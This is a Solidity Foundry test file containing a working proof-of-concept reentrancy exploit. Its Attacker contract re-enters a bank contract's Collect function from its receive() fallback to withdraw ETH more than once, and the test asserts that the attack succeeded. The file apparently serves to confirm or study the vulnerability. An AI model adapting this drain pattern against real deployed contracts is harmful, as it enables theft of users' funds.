import {U_BANK, Log} from "../src/U_BANK.sol";

contract TestReentrancyU_BANK is Test {
    U_BANK public _contractUnderTest;
    Log public _logContract;
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new U_BANK(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // MinSum is 2 ether, so attackVal must be >= 2 ether
        // Limit upper bound to avoid overflow issues
        vm.assume(attackVal >= 2 ether && attackVal <= 10 ether);

        // Fund the victim contract with extra ETH (so there's ETH to steal during reentry)
        vm.deal(address(_contractUnderTest), attackVal * 4);
        
        // Fund the attacker to make the initial deposit
        vm.deal(address(_attacker), attackVal);

        // Fund the test contract
        vm.deal(address(this), attackVal);

        // Setup: deposit funds into U_BANK to establish a balance
        _attacker.setupAttack{value: attackVal}(attackVal);

        // Warp time forward so block.timestamp > acc.unlockTime
        vm.warp(block.timestamp + 1);

        // Execute the reentrancy attack
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    U_BANK public victim;
    uint256 public reentrancyCount;
    bool public exploitSucceeded;
    uint256 public attackAmount;

    constructor(address victimAddress) {
        victim = U_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        
        // Deposit into U_BANK; unlockTime = 0 means it becomes unlockable
        // after block.timestamp advances
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        attackAmount = val;
        
        // Initiate the attack by calling Collect
        victim.Collect(val);
        
        // After the attack completes, check if reentrancy occurred
        if (reentrancyCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            // Re-enter the vulnerable Collect function
            victim.Collect(attackAmount);
        }
    }
}
